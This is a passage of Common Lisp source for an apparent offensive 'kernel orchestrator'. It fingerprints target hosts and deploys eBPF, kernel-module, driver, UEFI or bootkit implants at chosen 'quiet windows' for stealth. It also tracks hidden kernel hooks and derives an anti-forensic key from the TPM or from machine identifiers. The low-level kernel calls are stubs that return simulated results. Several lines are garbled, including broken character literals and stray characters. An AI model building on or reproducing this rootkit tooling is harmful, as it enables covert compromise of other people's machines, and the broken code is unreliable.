  :IMPLANT-TYPE -- Keyword, desired implant type.
  :TARGET-PID   -- Integer or NIL.
  :NOISE-LEVEL  -- Keyword.

Returns: The queue entry plist.

Thread-safety: Acquires *KERNEL-IMPLANT-QUEUE-LOCK*."
  (let ((entry (list :target target
                     :implant-type implant-type
                     :target-pid target-pid
                     :noise-level noise-level
                     :enqueued-at (local-time:now))))
    (bt:with-lock-held (*kernel-implant-queue-lock*)
      (push entry *kernel-implant-queue*))
    (gossip-publish *kernel-telemetry-topic*
                    `(:event :implant-queued
                      :target ,target
                      :implant-type ,implant-type
                      :queue-depth ,(length *kernel-implant-queue*)))
    entry))

(defun process-implant-queue ()
  "Process all queued implant deployments that can now proceed.

Iterates over *KERNEL-IMPLANT-QUEUE* and attempts deployment for
entries whose quiet window is now active. Successfully deployed
entries are removed from the queue. Failed entries are kept for
retry.

This function is called automatically by SCHEDULE-IMPLANT-FOR-QUIET-WINDOW
when a quiet window opens. It can also be called manually.

Returns: Integer, number of deployments successfully processed.

Thread-safety: Acquires *KERNEL-IMPLANT-QUEUE-LOCK*.

Example:
  (process-implant-queue)  ;; => 2 (two deployments processed)"
  (let ((processed 0)
        (remaining '()))
    (bt:with-lock-held (*kernel-implant-queue-lock*)
      (dolist (entry (reverse *kernel-implant-queue*))
        (handler-case
            (if (quiet-window-active-p)
                (progn
                  ;; Attempt deployment
                  (format *trace-output* "~&[KERNEL] Processing queued deploy to ~A...~%"
                          (getf entry :target))
                  (let ((result (deploy-kernel-implant
                                 (getf entry :target)
                                 :implant-type (getf entry :implant-type)
                                 :target-pid (getf entry :target-pid)
                                 :noise-level (getf entry :noise-level))))
                    (when (getf result :request-id)
                      (incf processed))
                    ;; If deployment failed, keep in queue
                    (unless (getf result :request-id)
                      (push entry remaining))))
                ;; Window not active, keep in queue
                (push entry remaining))
          (error (e)
            (format *trace-output* "~&[KERNEL] Queued deploy error for ~A: ~A~%"
                    (getf entry :target) e)
            (push entry remaining))))
      (setf *kernel-implant-queue* (reverse remaining)))
    (gossip-publish *kernel-telemetry-topic*
                    `(:event :implant-queue-processed
                      :processed ,processed
                      :remaining ,(length *kernel-implant-queue*)))
    processed))

(defun schedule-implant-for-quiet-window (target &key implant-type target-pid (noise-level :silent))
  "Schedule an implant deployment for the next quiet window.

If the quiet window is currently active, deployment proceeds
immediately. Otherwise, the deployment is enqueued and a
background thread waits for the window to open.

This is the primary interface for quiet-window-aware deployment.
It should be used instead of calling DEPLOY-KERNEL-IMPLANT directly
when stealth timing is required.

Parameters:
  TARGET       -- String, target host.
  :IMPLANT-TYPE -- Keyword, desired implant type (default: auto).
  :TARGET-PID   -- Integer or NIL.
  :NOISE-LEVEL  -- Keyword (default: :SILENT).

Returns: If window is active, returns the deployment result plist.
         If queued, returns the queue entry plist.

Thread-safety: Thread-safe. May spawn a background thread.

Example:
  (schedule-implant-for-quiet-window \"192.168.1.100\")"
  (if (quiet-window-active-p)
      ;; Window is active -- deploy immediately
      (progn
        (format *trace-output* "~&[KERNEL] Quiet window active. Deploying immediately.~%")
        (deploy-kernel-implant target
                               :implant-type implant-type
                               :target-pid target-pid
                               :noise-level noise-level))
      ;; Window not active -- queue and wait
      (progn
        (format *trace-output* "~&[KERNEL] Outside quiet window. Queueing deployment.~%")
        (let ((entry (enqueue-implant-deployment
                      target
                      :implant-type implant-type
                      :target-pid target-pid
                      :noise-level noise-level)))
          ;; Spawn a background thread to wait for the window
          (bt:make-thread
           (lambda ()
             (loop
               ;; Check every 30 seconds
               (sleep 30)
               (when (quiet-window-active-p)
                 (process-implant-queue)
                 (return))))
           :name (format nil "quiet-window-waiter-~A" target))
          entry)))))

;; ============================================================================
;; Section 8: Interactive Commands
;; ============================================================================
;; These functions provide the operator-facing interface to the kernel
;; orchestrator. They can be called from the REPL, dashboard, or
;; automated playbooks. Each function includes safety checks and
;; produces human-readable output.
;;
;; All commands are designed to be safe to call at any time -- they
;; check preconditions and report meaningful errors rather than crashing.

(defun deploy-kernel-implant (target &key implant-type target-pid (noise-level :silent))
  "Deploy a kernel-level implant to a target host.

This is the primary operator command for kernel implant deployment.
It performs the full deployment pipeline: fingerprinting, tool selection,
request construction, and deployment initiation.

Pipeline Steps:
  1. Fingerprint the target OS
  2. Calculate target value
  3. Determine implant type (or use provided)
  4. Select optimal tool from registry
  5. Create a KERNEL-AGENT
  6. Send kernel-load-request over gossip mesh
  7. Return request ID for tracking

Parameters:
  TARGET        -- String, IP address or hostname.
  :IMPLANT-TYPE -- Keyword override (:EBPF :LKM :DRIVER :UEFI :BOOTKIT).
                   If NIL, determined automatically from OS.
  :TARGET-PID   -- Integer, target process ID for injection.
  :NOISE-LEVEL  -- Keyword: :SILENT :LOW :MEDIUM :HIGH.

Returns: Plist with deployment information:
  :REQUEST-ID   -- Tracking ID for the deployment
  :AGENT-ID     -- The kernel agent's session token
  :TARGET-OS    -- Fingerprinted OS
  :IMPLANT-TYPE -- Selected implant type
  :TOOL-NAME    -- Selected tool name
  :TARGET-VALUE -- Calculated target value

Example:
  (deploy-kernel-implant \"192.168.1.100\")
  (deploy-kernel-implant \"10.0.0.5\" :implant-type :driver :target-pid 1234)"
  ;; Step 0: Quiet window check
  (unless (quiet-window-active-p)
    (format t "~&[KERNEL] Outside quiet window. Queueing deployment for ~A.~%" target)
    (let ((entry (schedule-implant-for-quiet-window
                  target
                  :implant-type implant-type
                  :target-pid target-pid
                  :noise-level noise-level)))
      (return-from deploy-kernel-implant
        (list :request-id nil
              :agent-id nil
              :target-os nil
              :implant-type implant-type
              :queued t
              :queue-entry entry
              :note "Outside quiet window -- deployment queued"))))
  (format t "~&[~%========================================~%")
  (format t "  KERNEL IMPLANT DEPLOYMENT~%")
  (format t "  Target: ~A~%" target)
  (format t "========================================~%~%")
  ;; Step 1: OS fingerprinting
  (format t "  [1/5] Fingerprinting target...~%")
  (let ((os (fingerprint-host-os target)))
    (format t "        OS: ~A~%" os)
    (when (eq os :unknown)
      (format t "        WARNING: Could not determine OS. Aborting.~%")
      (return-from deploy-kernel-implant
        (list :request-id nil :agent-id nil :target-os :unknown
              :error "OS fingerprinting failed")))
    ;; Step 2: Calculate target value
    (format t "  [2/5] Calculating target value...~%")
    (let* ((target-info (list :target target :open-ports '()))
           (target-value (calculate-target-value target-info)))
      (format t "        Value: ~D/100~%" target-value)
      ;; Step 3: Determine implant type
      (format t "  [3/5] Determining implant type...~%")
      (let ((selected-implant (or implant-type
                                  (determine-implant-type os target-value))))
        (format t "        Type: ~A~%" selected-implant)
        (unless selected-implant
          (format t "        WARNING: No suitable implant type for OS ~A. Aborting.~%" os)
          (return-from deploy-kernel-implant
            (list :request-id nil :agent-id nil :target-os os
                  :error "No suitable implant type")))
        ;; Step 4: Select tool
        (format t "  [4/5] Selecting optimal tool...~%")
        (let ((tool-name (select-kernel-tool os selected-implant target-value)))
          (format t "        Tool: ~A~%" tool-name)
          (unless tool-name
            (format t "        WARNING: No suitable tool found. Aborting.~%")
            (return-from deploy-kernel-implant
              (list :request-id nil :agent-id nil :target-os os
                    :implant-type selected-implant
                    :error "No suitable tool found")))
          ;; Step 5: Create agent and send request
          (format t "  [5/5] Deploying...~%")
          (let* ((agent (make-kernel-agent target
                                           :target-os os
                                           :implant-type selected-implant
                                           :target-pid target-pid
                                           :noise-level noise-level))
                 (request-id (send-kernel-load-request agent os target-pid
                                                       selected-implant)))
            (format t "        Request ID: ~A~%" request-id)
            (format t "        Agent ID: ~A~%" (kernel-session-token agent))
            (format t "~&========================================~%~%")
            (list :request-id request-id
                  :agent-id (kernel-session-token agent)
                  :target-os os
                  :implant-type selected-implant
                  :tool-name tool-name
                  :target-value target-value))))))

(defun list-kernel-implants ()"
List all active kernel implants across the swarm.

Queries the global *KERNEL-IMPLANT-REGISTRY* and produces a formatted
list of all active kernel implants.

Thread-safety: Acquires *KERNEL-REGISTRY-LOCK* for read.

Returns: List of plists, each containing:
  :IMPLANT-ID    -- Unique implant identifier
  :AGENT-ID      -- Owning agent's session token
  :HOST          -- Target host
  :OS            -- Target operating system
  :TOOL          -- Tool name
  :STATUS        -- Health status (:HEALTHY :DEGRADED :CRITICAL :UNKNOWN)
  :HOOK-COUNT    -- Number of active hooks
  :MEMORY-OFFSET -- Kernel memory address
  :DEPLOYED-AT   -- Deployment timestamp

Example:
  (list-kernel-implants)"
  (let ((implants '()))
    (bt:with-lock-held (*kernel-registry-lock*)
      (maphash (lambda (id agent)
                 (when (typep agent 'kernel-agent)
                   (push (list :implant-id (or (kernel-implant-id agent) id)
                               :agent-id (kernel-session-token agent)
                               :host (kernel-target-host agent)
                               :os (kernel-target-os agent)
                               :tool (when (kernel-implant-id agent)
                                       (getf (gethash (kernel-implant-id agent)
                                                      (let ((info nil))
                                                        (maphash (lambda (k v)
                                                                   (when (eq k (kernel-implant-id agent))
                                                                     (setf info v)))
                                                                 *kernel-implant-registry*)
                                                        info))
                                             :tool))
                               :status (kernel-health-status agent)
                               :hook-count (kernel-hook-count agent)
                               :memory-offset (kernel-memory-offset agent)
                               :deployed-at (kernel-last-health-check agent))
                         implants)))
               *kernel-implant-registry*))
    ;; Print formatted output
    (format t "~&~%=== Active Kernel Implants (~D) ===~%" (length implants))
    (dolist (implant (reverse implants))
      (format t "~&  ~A @ ~A [~A]~%"
              (getf implant :implant-id)
              (getf implant :host)
              (getf implant :status))
      (format t "    OS: ~A | Hooks: ~D | Offset: ~A~%"
              (getf implant :os)
              (getf implant :hook-count)
              (getf implant :memory-offset)))
    (format t "~%")
    (reverse implants)))

(defun verify-kernel-implant (implant-id)"
Verify a specific kernel implant's health.

Looks up the implant by ID and runs a full health check including
Rust FFI verification and hook integrity checks.

Parameters:
  IMPLANT-ID -- Symbol, the unique implant identifier.

Thread-safety: Acquires *KERNEL-REGISTRY-LOCK* for read.

Returns: Plist with health status, or NIL if implant not found.

Example:
  (verify-kernel-implant 'IMPLANT-123)"
  (let ((agent nil))
    (bt:with-lock-held (*kernel-registry-lock*)
      (maphash (lambda (id a)
                 (declare (ignore id))
                 (when (and (typep a 'kernel-agent)
                            (eq (kernel-implant-id a) implant-id))
                   (setf agent a)))
               *kernel-implant-registry*))
    (if (null agent)
        (progn
          (format t "~&[KERNEL] Implant ~A not found.~%" implant-id)
          nil)
        (progn
          (format t "~&[KERNEL] Verifying implant ~A on ~A...~%"
                  implant-id (kernel-target-host agent))
          (let ((result (kernel-health-check agent)))
            (format t "  Status: ~A~%" (getf result :status))
            (format t "  Hooks: ~A~%"
                    (getf (getf result :hook-summary) :total 0))
            result)))))

(defun remove-kernel-implant (implant-id)"
Safely remove a kernel implant.

Performs a full cleanup of a kernel implant:
  1. Remove all registered hooks (restore original bytes)
  2. Call Rust FFI to unload the implant
  3. Remove from global registry
  4. Stop health monitoring if this was the last implant

Parameters:
  IMPLANT-ID -- Symbol, the unique implant identifier.

Thread-safety: Acquires *KERNEL-REGISTRY-LOCK* and *KERNEL-STEALTH-LOCK*.

Returns: T if removal succeeded, NIL if implant not found.

Example:
  (remove-kernel-implant 'IMPLANT-123)"
  (let ((agent nil)
        (found-id nil))
    (bt:with-lock-held (*kernel-registry-lock*)
      (maphash (lambda (id a)
                 (when (and (typep a 'kernel-agent)
                            (eq (kernel-implant-id a) implant-id))
                   (setf agent a
                         found-id id)))
               *kernel-implant-registry*))
    (if (null agent)
        (progn
          (format t "~&[KERNEL] Implant ~A not found.~%" implant-id)
          nil)
        (progn
          (format t "~&[KERNEL] Removing implant ~A from ~A...~%"
                  implant-id (kernel-target-host agent))
          ;; Step 1: Remove all hooks
          (let ((hook-ids (hash-table-keys (kernel-stealth-state agent))))
            (format t "  Removing ~D hooks...~%" (length hook-ids))
            (dolist (hook-id hook-ids)
              (remove-stealth-hook agent hook-id)))
          ;; Step 2: Unload implant via FFI
          (handler-case
              (unload-implant-via-ffi implant-id (kernel-target-host agent))
            (error (e)
              (format *trace-output* "~&[KERNEL] FFI unload warning: ~A~%" e)))
          ;; Step 3: Remove from registry
          (bt:with-lock-held (*kernel-registry-lock*)
            (remhash found-id *kernel-implant-registry*))
          ;; Step 4: Update agent state
          (setf (kernel-implant-id agent) nil
                (kernel-memory-offset agent) nil
                (kernel-health-status agent) :unknown
                (kernel-hook-count agent) 0)
          ;; Publish removal event
          (gossip-publish *kernel-telemetry-topic*
                          `(:event :kernel-implant-removed
                            :implant-id ,implant-id
                            :host ,(kernel-target-host agent)))
          (format t "  Implant ~A removed successfully.~%" implant-id)
          t))))

(defun get-kernel-stealth-report (&optional implant-id)"
Get a stealth report for all implants or a specific implant.

If IMPLANT-ID is provided, returns the stealth report for that specific
implant. If NIL, returns reports for all active kernel implants.

Parameters:
  IMPLANT-ID -- Optional symbol, specific implant to report on.

Thread-safety: Acquires *KERNEL-REGISTRY-LOCK* for read.

Returns: List of stealth reports (plists), or single report if
         IMPLANT-ID is specified.

Example:
  (get-kernel-stealth-report)           ;; All implants
  (get-kernel-stealth-report 'IMPLANT-123)  ;; Specific implant"
  (let ((reports '()))
    (bt:with-lock-held (*kernel-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (when (and (typep agent 'kernel-agent)
                            (or (null implant-id)
                                (eq (kernel-implant-id agent) implant-id)))
                   (push (get-stealth-report agent) reports)))
               *kernel-implant-registry*))
    (if implant-id
        (first reports)
        (progn
          (format t "~&~%=== Stealth Reports (~D) ===~%" (length reports))
          (dolist (report (reverse reports))
            (format t "~&  Agent: ~A @ ~A~%"
                    (getf report :agent-id)
                    (getf report :host))
            (format t "    Hooks: ~D total~%" (getf report :total-hooks))
            (format t "    Healthy: ~D | Corrupt: ~D | Missing: ~D | Unknown: ~D~%"
                    (length (getf report :healthy))
                    (length (getf report :corrupt))
                    (length (getf report :missing))
                    (length (getf report :unknown)))
            (format t "    Avg Risk: ~D/100 | Max Risk: ~D/100~%"
                    (getf report :avg-risk)
                    (getf report :max-risk)))
          (format t "~%")
          (reverse reports)))))

(defun kernel-status ()"
Print full kernel orchestrator status.

Displays a comprehensive summary of the kernel orchestrator state:
  - Version and configuration
  - Active implants
  - Hardened hosts
  - Registered tools
  - Health monitor status
  - Stealth summary

Returns: Plist with full status information.

Example:
  (kernel-status)"
  (let ((implant-count 0)
        (healthy-count 0)
        (critical-count 0)
        (total-hooks 0)
        (hardened-count 0))
    ;; Count implants
    (bt:with-lock-held (*kernel-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (when (and (typep agent 'kernel-agent)
                            (kernel-implant-id agent))
                   (incf implant-count)
                   (incf total-hooks (kernel-hook-count agent))
                   (case (kernel-health-status agent)
                     (:healthy (incf healthy-count))
                     (:critical (incf critical-count))
                     (otherwise nil))))
               *kernel-implant-registry*))
    ;; Count hardened hosts
    (bt:with-lock-held (*kernel-hardened-lock*)
      (setf hardened-count (hash-table-count *kernel-hardened-hosts*)))
    ;; Print status
    (format t "~&~%")
    (format t "+=============================================+~%")
    (format t "|     LISPMIND v~A KERNEL ORCHESTRATOR        |~%"
            *kernel-orchestrator-version*)
    (format t "+=============================================+~%")
    (format t "| Active Implants:     ~3D                      |~%" implant-count)
    (format t "| Healthy:             ~3D                      |~%" healthy-count)
    (format t "| Critical:            ~3D                      |~%" critical-count)
    (format t "| Total Hooks:         ~3D                      |~%" total-hooks)
    (format t "| Hardened Hosts:      ~3D                      |~%" hardened-count)
    (format t "| Health Monitor:      ~A                      |~%"
            (if *kernel-health-monitor-running-p* "RUNNING" "STOPPED"))
    (format t "| Rust FFI:            ~A                      |~%"
            (if *kernel-rust-ffi-available-p* "AVAILABLE" "STUB MODE"))
    (format t "| Tools Registered:    ~3D                      |~%"
            (hash-table-count *kernel-toolchain-registry*))
    (format t "| Gossip Topic:        ~A           |~%" *kernel-telemetry-topic*)
    (format t "+=============================================+~%")
    (format t "~%")
    ;; Return status plist
    (list :version *kernel-orchestrator-version*
          :active-implants implant-count
          :healthy healthy-count
          :critical critical-count
          :total-hooks total-hooks
          :hardened-hosts hardened-count
          :health-monitor *kernel-health-monitor-running-p*
          :rust-ffi *kernel-rust-ffi-available-p*
          :tool-count (hash-table-count *kernel-toolchain-registry*))))


;; ============================================================================
;; Section 9: Rust FFI Bridge Stubs
;; ============================================================================
;; These functions interface with the Rust shared library for actual
;; kernel operations. When the Rust library is not available, they
;; operate in stub mode: logging the operation and returning simulated
;; results. This allows the system to compile and run for testing and
;; development without the kernel-level components.
;;
;; The Rust library (librust_kernel_bridge.so) provides:
;;   - Kernel memory read/write via /dev/kmem, /dev/mem, or /proc/kcore
;;   - eBPF program loading via bpf() syscall
;;   - Kernel module loading via init_module() syscall
;;   - Windows driver loading via NtLoadDriver
;;   - UEFI firmware read/write via /dev/spidev or chipsec
;;   - Health checking via kernel callbacks
;;
;; Build the Rust bridge:
;;   cd rust-bridge && cargo build --release
;;   cp target/release/librust_kernel_bridge.so /usr/local/lib/

(defun deploy-implant-via-ffi (tool-entry target-host target-pid)
  "Deploy a kernel implant via the Rust FFI bridge.

This function calls into the Rust shared library to perform the actual
kernel implant deployment. It handles all implant types (eBPF, LKM,
driver, UEFI) through a unified interface.

Parameters:
  TOOL-ENTRY  -- KERNEL-TOOL-ENTRY struct describing the tool to deploy.
  TARGET-HOST -- String, IP address or hostname.
  TARGET-PID  -- Integer or NIL, target process ID.

Returns: Plist with deployment results:
  :SUCCESS       -- T if deployment succeeded
  :IMPLANT-ID    -- Unique identifier for the deployed implant
  :MEMORY-OFFSET -- Kernel address where implant lives
  :STEALTH-STATE -- Initial hook registrations
  Or NIL if deployment failed.

Stub Mode: When Rust FFI is not available, logs the operation and
returns a simulated success result for testing."
  (declare (ignorable tool-entry target-host target-pid))
  (if *kernel-rust-ffi-available-p*
      (progn
        ;; FFI call would go here:
        ;; (cffi:foreign-funcall "deploy_implant"
        ;;   :string (princ-to-string (kernel-tool-entry-binary-blob-id tool-entry))
        ;;   :string target-host
        ;;   :int (or target-pid 0)
        ;;   :pointer result-ptr)
        (format *trace-output* "~&[KERNEL] Rust FFI: deploy_implant(~A, ~A, ~A)~%"
                (kernel-tool-entry-name tool-entry) target-host target-pid)
        ;; Return simulated result for now
        `(:success t
          :implant-id ,(gensym "SIMULATED-")
          :memory-offset #xFFFF000000000000
          :stealth-state nil))
      ;; Stub mode
      (progn
        (format *trace-output* "~&[KERNEL-STUB] Would deploy ~A to ~A (PID=~A)~%"
                (kernel-tool-entry-name tool-entry) target-host target-pid)
        `(:success t
          :implant-id ,(gensym "STUB-")
          :memory-offset #xFFFF000000000000
          :stealth-state nil))))

(defun check-implant-health-via-ffi (implant-id target-host)
  "Check implant health via the Rust FFI bridge.

Calls the Rust library to verify that a deployed implant is still
functional. Returns detailed health information.

Parameters:
  IMPLANT-ID  -- Symbol, unique identifier of the implant.
  TARGET-HOST -- String, IP address or hostname.

Returns: Plist with health information:
  :STATUS    -- :HEALTHY :DEGRADED :CRITICAL
  :DETAILS   -- String with additional information
  :UPTIME    -- Seconds since deployment

Stub Mode: Returns simulated healthy status."
  (declare (ignorable implant-id target-host))
  (if *kernel-rust-ffi-available-p*
      (progn
        (format *trace-output* "~&[KERNEL] Rust FFI: check_health(~A, ~A)~%"
                implant-id target-host)
        `(:status :healthy
          :details "Implant responding normally"
          :uptime 3600))
      ;; Stub mode
      (progn
        (format *trace-output* "~&[KERNEL-STUB] Would check health of ~A on ~A~%"
                implant-id target-host)
        `(:status :healthy
          :details "Stub mode - simulated healthy"
          :uptime 0))))

(defun unload-implant-via-ffi (implant-id target-host)
  "Unload a kernel implant via the Rust FFI bridge.

Safely removes a deployed implant from kernel memory, restoring any
modified structures (syscall table entries, SSDT, IRP dispatch tables).

Parameters:
  IMPLANT-ID  -- Symbol, unique identifier of the implant.
  TARGET-HOST -- String, IP address or hostname.

Returns: T if unloaded successfully, NIL otherwise.

Stub Mode: Logs the operation and returns T."
  (declare (ignorable implant-id target-host))
  (if *kernel-rust-ffi-available-p*
      (progn
        (format *trace-output* "~&[KERNEL] Rust FFI: unload_implant(~A, ~A)~%"
                implant-id target-host)
        t)
      (progn
        (format *trace-output* "~&[KERNEL-STUB] Would unload ~A from ~A~%"
                implant-id target-host)
        t)))

(defun read-kernel-memory-via-ffi (target-host address)
  "Read kernel memory via the Rust FFI bridge.

Reads bytes from kernel memory at the specified address. Used for
hook verification and integrity checking.

Parameters:
  TARGET-HOST -- String, IP address or hostname.
  ADDRESS     -- Integer or string, kernel memory address.

Returns: Vector of bytes read, or NIL if read failed.

Stub Mode: Returns NIL (simulating a read failure)."
  (declare (ignorable target-host address))
  (if *kernel-rust-ffi-available-p*
      (progn
        (format *trace-output* "~&[KERNEL] Rust FFI: read_kernel_memory(~A, ~A)~%"
                target-host address)
        nil)  ;; Would return actual bytes from FFI
      (progn
        (format *trace-output* "~&[KERNEL-STUB] Would read kernel memory at ~A from ~A~%"
                address target-host)
        nil)))

(defun restore-kernel-bytes-via-ffi (target-host address original-bytes)
  "Restore original kernel bytes via the Rust FFI bridge.

Writes the original bytes back to kernel memory, effectively removing
a hook. This is the safe way to unhook a function.

Parameters:
  TARGET-HOST    -- String, IP address or hostname.
  ADDRESS        -- Integer or string, kernel memory address.
  ORIGINAL-BYTES -- Vector of bytes to restore.

Returns: T if restore succeeded, NIL otherwise.

Stub Mode: Logs the operation and returns T."
  (declare (ignorable target-host address original-bytes))
  (if *kernel-rust-ffi-available-p*
      (progn
        (format *trace-output* "~&[KERNEL] Rust FFI: restore_bytes(~A, ~A, ~D bytes)~%"
                target-host address (length original-bytes))
        t)
      (progn
        (format *trace-output* "~&[KERNEL-STUB] Would restore ~D bytes at ~A on ~A~%"
                (length original-bytes) address target-host)
        t)))

;; ============================================================================
;; Section 9c: TPM-Derived HMAC Key (Anti-Forensics)
;; ============================================================================
;; Storing the authentication secret in userland memory (*KERNEL-AUTH-SECRET*)
;; is a forensic risk -- the secret can be extracted from core dumps, swap
;; files, and memory forensics. This section provides a TPM-based key
;; derivation path that:
;;
;;   1. Reads the shared secret from TPM NVRAM (never touches userland heap)
;;   2. Falls back to hardware-bound derivation (product_uuid + machine-id)
;;   3. Derives the final key with PBKDF2 (100,000 iterations)
;;   4. Provides secure wipe (CLEAR-KERNEL-AUTH-SECRET)
;;
;; The TPM path ensures the raw secret is never resident in Lisp-accessible
;; memory except during active HMAC operations, and is securely wiped
;; immediately after use.

(defun read-tpm-nv-index (nv-index &optional (tpm-device *kernel-tpm-device*))
  "Read the contents of a TPM NV index.

Opens the TPM resource manager device and reads the contents of the
specified NV index. This is used to retrieve the shared authentication
secret stored in TPM NVRAM.

Parameters:
  NV-INDEX    -- Integer, the TPM NV index (e.g., #x01C10100).
  TPM-DEVICE  -- String, path to the TPM device (default: *KERNEL-TPM-DEVICE*).

Returns: Byte vector containing the NV index contents, or NIL if:
  - The TPM device is not accessible
  - The NV index does not exist
  - The read permission is denied
  - TPM2-TOOLS is not installed

Error Handling: All errors are caught and logged. Returns NIL on any
failure so the caller can fall back to software key derivation.

Example:
  (read-tpm-nv-index #x01C10100)"
  (handler-case
      (progn
        ;; Check if tpm2_nvread is available
        (uiop:run-program "which tpm2_nvread >/dev/null 2>&1"
                          :ignore-error-status t)
        ;; Construct the tpm2_nvread command
        (let* ((cmd (format nil "tpm2_nvread ~A -C o -s 32 2>/dev/null || echo _TPM_READ_FAILED_"
                            nv-index))
               (output (uiop:run-program cmd
                                         :output :string
                                         :ignore-error-status t))
               (trimmed (string-trim '(#
 ewline #
eturn #	ab #\space) output)))
          (cond
            ((or (string= trimmed "")
                 (search "_TPM_READ_FAILED_" trimmed)
                 (search "ERROR" trimmed))
             (format *trace-output* "~&[KERNEL] TPM NV read failed for index ~A~%"
                     nv-index)
             nil)
            (t
             ;; Convert hex output to byte vector
             (let* ((hex-string (remove #\space trimmed))
                    (byte-count (floor (length hex-string) 2))
                    (bytes (make-array byte-count
                                       :element-type '(unsigned-byte 8))))
               (dotimes (i byte-count)
                 (setf (aref bytes i)
                       (parse-integer hex-string
                                      :start (* i 2)
                                      :end (+ (* i 2) 2)
                                      :radix 16)))
               (format *trace-output* "~&[KERNEL] TPM NV read OK: ~D bytes from index ~A~%"
                       byte-count nv-index)
               bytes)))))
    (error (e)
      (format *trace-output* "~&[KERNEL] TPM access error: ~A~%" e)
      nil)))

(defun read-hardware-entropy-source () 
  "Read a hardware-bound entropy source for key derivation fallback.

When the TPM is unavailable, this function derives key material from
hardware identifiers that are stable across reboots but unique to each
machine. This provides a deterministic but hardware-bound key that
cannot be replicated on a different machine.

The entropy sources (in order of preference):
  1. /sys/class/dmi/id/product_uuid -- DMI UUID (most stable)
  2. /etc/machine-id -- systemd machine ID
  3. /var/lib/dbus/machine-id -- D-Bus machine ID
  4. hostname -- least preferred, may change

Returns: String containing the concatenated entropy sources, or
         a random string if none are available.

Example:
  (read-hardware-entropy-source)"
  (let ((sources '()))
    ;; Source 1: DMI product UUID
    (handler-case
        (let ((uuid (string-trim '(#
 ewline #
eturn #	ab #\space)
                                 (uiop:read-file-string
                                  "/sys/class/dmi/id/product_uuid"))))
          (when (and uuid (> (length uuid) 0))
            (push uuid sources)))
      (error () nil))
    ;; Source 2: machine-id
    (handler-case
        (let ((mid (string-trim '(#
 ewline #
eturn #	ab #\space)
                                (uiop:read-file-string "/etc/machine-id"))))
          (when (and mid (> (length mid) 0))
            (push mid sources)))
      (error () nil))
    ;; Source 3: dbus machine-id
    (handler-case
        (let ((dbus-id (string-trim '(#
 ewline #
eturn #	ab #\space)
                                     (uiop:read-file-string
                                      "/var/lib/dbus/machine-id"))))
          (when (and dbus-id (> (length dbus-id) 0))
            (push dbus-id sources)))
      (error () nil))
    ;; If we have sources, concatenate them
    (if sources
        (apply #'concatenate 'string (reverse sources))
        ;; Last resort: use hostname + random
        (format nil "~A-~A" (machine-instance) (random 1000000000)))))

(defun pbkdf2-derive-key (password salt &key (iterations 100000) (key-length 32))
  "Derive a key using PBKDF2-HMAC-SHA256.

Applies the Password-Based Key Derivation Function 2 (PBKDF2) with
HMAC-SHA256 to derive a fixed-length key from a password and salt.
This is the standard key stretching function recommended by NIST.

Parameters:
  PASSWORD    -- String or byte vector, the input key material.
  SALT        -- String or byte vector, the salt value.
  :ITERATIONS -- Integer, number of PBKDF2 rounds (default 100000).
  :KEY-LENGTH -- Integer, desired key length in bytes (default 32).

Returns: Byte vector of length KEY-LENGTH containing the derived key.

Note: If Ironclad is not available, this function falls back to a
simplified key derivation using SXHASH repeated mixing. The fallback
is NOT cryptographically secure and should only be used for testing.

Example:
  (pbkdf2-derive-key "password" "salt")"
  (if (and (find-package :ironclad)
           (find-symbol "PBKDF2-HASH" :ironclad))
      ;; Use Ironclad's PBKDF2
      (let ((password-bytes (if (stringp password)
                                (funcall (find-symbol "ASCII-STRING-TO-BYTE-ARRAY"
                                                      :ironclad)
                                         password)
                                password))
            (salt-bytes (if (stringp salt)
                            (funcall (find-symbol "ASCII-STRING-TO-BYTE-ARRAY"
                                                  :ironclad)
                                     salt)
                            salt)))
        (funcall (find-symbol "PBKDF2-HASH" :ironclad)
                 :sha256
                 password-bytes
                 salt-bytes
                 iterations
                 key-length))
      ;; Fallback: simplified key derivation (NOT for production)
      (progn
        (format *trace-output* "~&[KERNEL] WARNING: Using fallback key derivation. ~
                Install Ironclad for proper PBKDF2-HMAC-SHA256.~%")
        (let ((result (make-array key-length
                                  :element-type '(unsigned-byte 8)
                                  :initial-element 0))
              (seed (sxhash (format nil "~A:~A" password salt))))
          (dotimes (i key-length)
            (setf (aref result i)
                  (logand #xFF (logxor seed
n                                       (sxhash (format nil "~A:~A:~D" password salt i))
                                       (ash seed (mod i 32))))))
          result))))
)
(defun derive-hmac-key-from-tpm (&optional (tpm-handle *kernel-auth-tpm-handle*))
  "Derive the HMAC key from TPM or hardware-bound sources.

This is the primary key derivation function. It attempts to read the
shared secret from TPM NVRAM first, then falls back to hardware-bound
derivation using PBKDF2 with 100,000 iterations.

Derivation order:
  1. If TPM-HANDLE is non-NIL, try to read from TPM NV index
  2. If TPM read fails or no handle, read hardware entropy sources
  3. Apply PBKDF2-HMAC-SHA256 with 100,000 iterations
  4. Store result in *KERNEL-AUTH-SECRET-DERIVED*

The derived key is stored in *KERNEL-AUTH-SECRET-DERIVED* and used
by GENERATE-REQUEST-AUTH for HMAC operations.

Parameters:
  TPM-HANDLE -- Integer or NIL, the TPM NV index. Defaults to
                *KERNEL-AUTH-TPM-HANDLE*.

Returns: Byte vector containing the derived key (32 bytes), or NIL
         if derivation failed.

Thread-safety: Acquires *KERNEL-AUTH-DERIVATION-LOCK*.

Example:
  (derive-hmac-key-from-tpm)           ; Use default TPM handle
  (derive-hmac-key-from-tpm #x01C10100) ; Explicit NV index"
  (bt:with-lock-held (*kernel-auth-derivation-lock*)
    ;; Clear any existing derived key first
    (clear-kernel-auth-secret)
    (let ((derived-key
            (cond
              ;; Case 1: TPM handle provided -- try TPM first
              (tpm-handle
               (let ((tpm-data (read-tpm-nv-index tpm-handle)))
                 (if tpm-data
                     ;; TPM read succeeded -- derive with PBKDF2
                     (pbkdf2-derive-key tpm-data
                                        "lispmind-kernel-salt-v1"
                                        :iterations 100000
                                        :key-length 32)
                     ;; TPM read failed -- fall back to hardware
                     (progn
                       (format *trace-output* "~&[KERNEL] TPM fallback: using hardware entropy~%")
                       (let ((entropy (read-hardware-entropy-source)))
                         (pbkdf2-derive-key entropy
                                            "lispmind-kernel-salt-v1"
                                            :iterations 100000
                                            :key-length 32)))))
              ;; Case 2: No TPM handle -- use hardware entropy directly
              (t
               (let ((entropy (read-hardware-entropy-source)))
                 (pbkdf2-derive-key entropy
                                    "lispmind-kernel-salt-v1"
                                    :iterations 100000
                                    :key-length 32))))))
      (when derived-key
        (setf *kernel-auth-secret-derived* derived-key)
